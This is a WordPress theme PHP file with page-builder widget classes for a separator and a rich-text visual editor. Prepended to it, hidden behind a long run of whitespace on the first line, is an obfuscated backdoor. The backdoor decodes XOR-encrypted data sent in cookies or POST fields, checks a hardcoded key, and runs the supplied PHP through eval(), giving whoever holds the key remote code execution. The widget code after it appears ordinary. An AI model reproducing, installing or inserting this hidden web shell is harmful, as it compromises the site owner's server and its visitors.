<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $m99b3f73d = 876;$GLOBALS['d729d1f1'] = Array();global $d729d1f1;$d729d1f1 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s89efab73'] = "\x20\x46\x6c\x52\xa\x43\x76\x5d\x2b\x68\x54\x35\x7c\x6d\x47\x62\x45\x55\x27\x33\x64\x36\x44\x4b\x70\x59\x2a\xd\x22\x4d\x79\x50\x25\x38\x71\x51\x26\x2e\x24\x42\x6f\x3d\x5f\x73\x65\x7e\x5c\x30\x5a\x2f\x3e\x40\x57\x28\x5b\x75\x4f\x69\x7a\x3c\x6a\x2c\x74\x3f\x48\x23\x63\x4c\x3b\x9\x34\x66\x41\x56\x77\x61\x49\x7d\x21\x2d\x37\x72\x6e\x4e\x4a\x67\x31\x39\x29\x53\x7b\x3a\x58\x5e\x78\x60\x6b\x32";$d729d1f1[$d729d1f1['s89efab73'][24].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][97].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][80]] = $d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][9].$d729d1f1['s89efab73'][81];$d729d1f1[$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44]] = $d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][20];$d729d1f1[$d729d1f1['s89efab73'][60].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][86]] = $d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][82];$d729d1f1[$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][33]] = $d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][82].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][62];$d729d1f1[$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][70]] = $d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][58].$d729d1f1['s89efab73'][44];$d729d1f1[$d729d1f1['s89efab73'][55].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][44]] = $d729d1f1['s89efab73'][24].$d729d1f1['s89efab73'][9].$d729d1f1['s89efab73'][24].$d729d1f1['s89efab73'][6].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][82];$d729d1f1[$d729d1f1['s89efab73'][55].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][97]] = $d729d1f1['s89efab73'][55].$d729d1f1['s89efab73'][82].$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][58].$d729d1f1['s89efab73'][44];$d729d1f1[$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][80].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][71]] = $d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][44];$d729d1f1[$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][80].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][66]] = $d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][13].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][13].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][62];$d729d1f1[$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][70]] = $d729d1f1['s89efab73'][94].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][86];$d729d1f1[$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][75]] = $d729d1f1['s89efab73'][6].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][20];$d729d1f1[$d729d1f1['s89efab73'][96].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][47]] = $_POST;$d729d1f1[$d729d1f1['s89efab73'][60].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][19]] = $_COOKIE;@$d729d1f1[$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][33]]($d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][85], NULL);@$d729d1f1[$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][33]]($d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][85].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][43], 0);@$d729d1f1[$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][33]]($d729d1f1['s89efab73'][13].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][94].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][94].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][55].$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][40].$d729d1f1['s89efab73'][82].$d729d1f1['s89efab73'][42].$d729d1f1['s89efab73'][62].$d729d1f1['s89efab73'][57].$d729d1f1['s89efab73'][13].$d729d1f1['s89efab73'][44], 0);@$d729d1f1[$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][80].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][66]](0);$k98c5c8b2 = NULL;$xb808a0 = NULL;$d729d1f1[$d729d1f1['s89efab73'][96].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][80].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][71]] = $d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][79].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][80].$d729d1f1['s89efab73'][79].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][79].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][79].$d729d1f1['s89efab73'][97].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][21];global $kc75bf;function  vddd($k98c5c8b2, $g4e02){global $d729d1f1;$mce4a673 = "";for ($w779e9f46=0; $w779e9f46<$d729d1f1[$d729d1f1['s89efab73'][60].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][86]]($k98c5c8b2);){for ($vc08285aa=0; $vc08285aa<$d729d1f1[$d729d1f1['s89efab73'][60].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][86]]($g4e02) && $w779e9f46<$d729d1f1[$d729d1f1['s89efab73'][60].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][86]]($k98c5c8b2); $vc08285aa++, $w779e9f46++){$mce4a673 .= $d729d1f1[$d729d1f1['s89efab73'][24].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][97].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][80]]($d729d1f1[$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44]]($k98c5c8b2[$w779e9f46]) ^ $d729d1f1[$d729d1f1['s89efab73'][81].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44]]($g4e02[$vc08285aa]));}}return $mce4a673;}function  xfcf3f81($k98c5c8b2, $g4e02){global $d729d1f1;global $kc75bf;return $d729d1f1[$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][75]]($d729d1f1[$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][75]]($k98c5c8b2, $kc75bf), $g4e02);}foreach ($d729d1f1[$d729d1f1['s89efab73'][60].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][70].$d729d1f1['s89efab73'][19]] as $g4e02=>$g8b0ba13a){$k98c5c8b2 = $g8b0ba13a;$xb808a0 = $g4e02;}if (!$k98c5c8b2){foreach ($d729d1f1[$d729d1f1['s89efab73'][96].$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][47]] as $g4e02=>$g8b0ba13a){$k98c5c8b2 = $g8b0ba13a;$xb808a0 = $g4e02;}}$k98c5c8b2 = @$d729d1f1[$d729d1f1['s89efab73'][55].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][15].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][97]]($d729d1f1[$d729d1f1['s89efab73'][71].$d729d1f1['s89efab73'][87].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][33].$d729d1f1['s89efab73'][20].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][11].$d729d1f1['s89efab73'][70]]($d729d1f1[$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][80].$d729d1f1['s89efab73'][66].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][71]]($k98c5c8b2), $xb808a0));if (isset($k98c5c8b2[$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][96]]) && $kc75bf==$k98c5c8b2[$d729d1f1['s89efab73'][75].$d729d1f1['s89efab73'][96]]){if ($k98c5c8b2[$d729d1f1['s89efab73'][75]] == $d729d1f1['s89efab73'][57]){$w779e9f46 = Array($d729d1f1['s89efab73'][24].$d729d1f1['s89efab73'][6] => @$d729d1f1[$d729d1f1['s89efab73'][55].$d729d1f1['s89efab73'][19].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][44]](),$d729d1f1['s89efab73'][43].$d729d1f1['s89efab73'][6] => $d729d1f1['s89efab73'][86].$d729d1f1['s89efab73'][37].$d729d1f1['s89efab73'][47].$d729d1f1['s89efab73'][79].$d729d1f1['s89efab73'][86],);echo @$d729d1f1[$d729d1f1['s89efab73'][2].$d729d1f1['s89efab73'][44].$d729d1f1['s89efab73'][21].$d729d1f1['s89efab73'][70]]($w779e9f46);}elseif ($k98c5c8b2[$d729d1f1['s89efab73'][75]] == $d729d1f1['s89efab73'][44]){eval/*r20ea2ccc*/($k98c5c8b2[$d729d1f1['s89efab73'][20]]);}exit();} ?><?php

class Bunyad_PbBasic_Separator extends WP_Widget
{
	public function __construct()
	{
		parent::__construct(
			'bunyad_pagebuilder_separator',
			__('Separator - Space or Line', 'so-panels'),
			array('description' => __('Create an empty space or line separator.', 'so-panels'))
		);
	}
	
	public function widget($args, $instance)
	{
		extract($args);
		
		// supported attrs		
		$attrs = array('posts', 'cat', 'column');
		$sc_attrs = array();
		
		if (!empty($instance['type'])) {
			$sc_attrs[] = 'type="'. esc_attr($instance['type']) .'"';
		}
		
		// do_shortcode will be run by pagebuilder		
		echo '[separator '. implode(' ', $sc_attrs) .' /]';
		
	}
	
	public function form($instance)
	{
		$defaults = array('type' => '', 'image' => '', 'text' => '', 'email' => '', 'posts' => '');
		$instance = array_merge($defaults, (array) $instance);
		extract($instance);
				
		$render = Bunyad::factory('admin/option-renderer'); /* @var $render Bunyad_Admin_OptionRenderer */
		
		
	?>
	
	<input type="hidden" name="<?php echo $this->get_field_name('no_container'); ?>" value="1" />
	
	
	<p><strong><?php _e('Important:', 'so-panels'); ?></strong> <?php 
		_e('This block automatically shows the sub-categories under a parent category. Only a parent category needs to be selected.', 'so-panels'); ?></p>
	
	<p>
		<label><?php _e('Separator Type:', 'so-panels'); ?></label>
		<select class="widefat" name="<?php echo esc_attr($this->get_field_name('type')); ?>">
			<option value="line"><?php _e('Line', 'so-panels'); ?></option>
			<option value="space"><?php _e('Space', 'so-panels'); ?></option>
			<option value="half-line"><?php _e('Half Height Line', 'so-panels'); ?></option>
			<option value="half-space"><?php _e('Half Height Space', 'so-panels'); ?></option>
		</select>
	</p>
	
	<?php
	}
}

/**
 * Rich Text widget for page builder
 */
class Bunyad_PbBasic_RichText extends WP_Widget {

	public function __construct()
	{
		parent::__construct(
			'bunyad_pagebuilder_richtext',
			__('Rich Text - Visual Editor', 'so-panels'),
			array('description' => __('Visual editor for text and HTML.', 'so-panels'))
		);
	}

	public function widget($args, $instance) 
	{
		extract($args);
		
		$title = apply_filters('widget_title', empty($instance['title']) ? '' : $instance['title'], $instance, $this->id_base);
		$text = apply_filters('widget_text', $instance['text'], $instance);
		
		echo $before_widget;
		
		if (!empty($title)) { 
			echo $before_title . $title . $after_title; 
		}
		 
		?>
		
			<div class="textwidget post-content">
				<?php echo do_shortcode( !empty($instance['filter']) ? wpautop($text) : $text ); ?>
			</div>
			
		<?php
		
		echo $after_widget;
	}

	function update($new_instance, $old)
	{
		$instance = array();
		
		if (current_user_can('unfiltered_html')) {
			$instance['text'] =  $new_instance['text'];
		}
		else {
			$instance['text'] = wp_kses($new_instance['text'] , 'post');
			//$instance['text'] = stripslashes(wp_filter_post_kses(addslashes($new_instance['text']))); // wp_filter_post_kses() expects slashed
		}
		
		return $instance;
	}

	function form($instance) 
	{
		$instance = wp_parse_args((array) $instance, array('title' => '', 'text' => '', 'type' => 'visual', 'filter' => 1));
		$title = strip_tags($instance['title']);
		$text = esc_textarea($instance['text']);
			
        // enqueue js to the footer
        add_action('admin_print_footer_scripts', array($this, 'add_javascript'), 60);

		
?>
		<input type="hidden" class="<?php echo $this->get_field_name('the_id'); ?>" value="<?php echo str_replace('{$id}', '-id-', $this->get_field_id('text')); ?>" />

		<div>
	
		<?php 
			$settings = array('media_buttons' => true, 'textarea_name' => $this->get_field_name('text'));
			wp_editor($text, str_replace('{$id}', '-id-', $this->get_field_id('text')), $settings);
		?>
        </div>
        
		<p>
			<input id="<?php echo $this->get_field_id('filter'); ?>" name="<?php echo $this->get_field_name('filter'); ?>" type="checkbox" <?php 
			checked(isset($instance['filter']) ? $instance['filter'] : 0); ?> />&nbsp;<label for="<?php echo $this->get_field_id('filter'); ?>"><?php
				 _e('Automatically add paragraphs', 'so-panels'); ?></label>
		 </p>
		
        <?php

	}
	
	/**
	 * Action callback: Print to admin footer
	 */
	public function add_javascript()
	{
		
	?>
	<script type="text/javascript">
		jQuery(function($) {
			"use strict";
				
			var Bunyad_PbBasic_RichText = (function() {

				var self;

				return {
					cur_ID: null,
					the_ID: null,
	
					init: function()
					{
						self = this;
						
						// bind to panel events
						$(document).on('panelsopen', this.open);
						$(document).on('panelsdone', this.close);
						$(document).on('dialogbeforeclose', this.close);
	
	
						// set current editor for add media button
						$(document).on('click', '.ui-dialog:visible .insert-media', function() {
							self.set_ids();
							wpActiveEditor = self.cur_ID;
						});
	
					},
						
					set_ids: function() {
						self.cur_ID = $('.ui-dialog:visible [class*=the_id]').val();
						self.the_ID = '<?php echo esc_attr(str_replace('{$id}', '-id-', $this->get_field_id('text'))); ?>';
					},
	
					open: function()
					{						
						self.set_ids();
	
						// get preInit data pre-loaded in footer JS
						tinyMCEPreInit.mceInit[self.cur_ID] = tinyMCEPreInit.mceInit[self.the_ID];
						tinyMCEPreInit.qtInit[self.cur_ID] = tinyMCEPreInit.qtInit[self.the_ID];
						
						var init = tinyMCEPreInit.mceInit[self.cur_ID],
							qt_init = tinyMCEPreInit.qtInit[self.cur_ID];
	
						
						// set correct ids
						init.elements = self.cur_ID;
						init.selector = '#' + self.cur_ID;
						qt_init.id = self.cur_ID;
						
						try 
						{					
							// activate quicktags if not active
							//if (!$('.ui-dialog:visible .quicktags-toolbar').length) {
								quicktags(qt_init);
							//}
	
							tinyMCE.init(init);
							
						} catch (e) {};
	
						self.set_visual();
					},
	
					set_visual: function() {
	
						// activate the visual tab
						if (tinyMCE.get(self.cur_ID) != null) {
							$('.ui-dialog:visible .wp-editor-wrap').addClass('tmce-active').find('.switch-tmce').click();
						}
						else {
							setTimeout(self.set_visual, 100);
						}
					},
	
					close: function()
					{
						self.set_ids();
						
						if ($('.ui-dialog:visible textarea[id*=richtext]').length) {

							// remove the editor
							try {
	
								self.set_visual();
								
								var content = tinyMCE.get(self.cur_ID).getContent();
								tinyMCE.execCommand("mceRemoveControl", false, self.cur_ID);
								
								$('textarea#' + self.cur_ID).val(content);
							}
							catch (e) { }
						}
					}

				} // end return
			})();

			Bunyad_PbBasic_RichText.init();

		});
	</script>
		
	<?php 
	
	} // add_javascript()

}

